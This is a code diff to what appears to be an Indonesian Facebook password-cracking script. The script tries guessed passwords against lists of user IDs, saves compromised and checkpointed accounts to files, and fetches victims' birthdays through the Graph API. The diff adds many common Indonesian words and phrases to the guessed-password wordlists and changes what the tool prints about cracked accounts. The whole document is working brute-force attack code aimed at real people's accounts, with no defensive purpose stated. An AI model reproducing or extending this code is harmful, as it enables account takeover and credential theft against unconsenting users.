@@ -48,7 +48,7 @@ def logika():
 		token=open("save","r").read()
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
 		nama=r['name']
-		print(f"[☆] Anda Sudah Login [☆]\nWelcome Back {nama}")
+		print(f" Anda Sudah Login \nWelcome Back {nama}")
 		time.sleep(1.5)
 		crack(token,nama).menu()
 	except FileNotFoundError:
@@ -92,7 +92,7 @@ class crack:
 			if 'c_user' in d.cookies.get_dict().keys():
 				ok+=1
 				open('ok','a').write(user+' '+pw+'\n')
-				print(f'\r\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                         \n(√) COOKIES\t: {"".join(d.cookies.get_dict())}\n-------------------------------------------\33[37;1m                     \n',end='')
+				print(f'\r\33[32;1m(√) TIDAK CHECKPOINT (✓)\n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                                            \n',end='')
 				coki={"cookie":"".join(d.cookies.get_dict())}
 				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
 				for fllow in r.find_all("a"):
@@ -107,7 +107,7 @@ class crack:
 					ttl=json.loads(req.get(f"https://graph.facebook.com/{user}?access_token={self.token}").text)['birthday']
 				except KeyError:ttl='-'
 				open('cp','a').write(user+' '+pw+' '+ttl+'\n')
-				print(f'\r\33[1;33m(×) CHECKPOINT (×)                                   \n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                                   \n(×) TTL\t\t: {ttl}                                   \n-------------------------------------------\33[37;1m                                   ',end='')
+				print(f'\r\33[1;33m(×) CHECKPOINT (×)                                   \n(+) USER\t: {user}                         \n(+) PASS\t: {pw}                                   \n(×) TTL\t\t: {ttl}                                   ',end='')
 				break
 	def crack2(self,user,lala,asu):
 		global ok,cp,cot,ajg
@@ -160,7 +160,7 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
+						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia','indonesiaku','mancung','ganteng','cantik','indonesia1945','jancok','bajingan','freefire','akusayangkamu','sayangkamu','iloveyou','doraemon','cintakamu']
 					elif(len(str(name.lower()))<=2):
 						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
 					elif(len(str(name.lower()))<=3):
@@ -180,7 +180,7 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
+						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia','indonesiaku','mancung','ganteng','cantik','indonesia1945','jancok','bajingan','freefire','akusayangkamu','sayangkamu','iloveyou','doraemon','cintakamu']
 					elif(len(str(name.lower()))<=2):
 						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
 					elif(len(str(name.lower()))<=3):
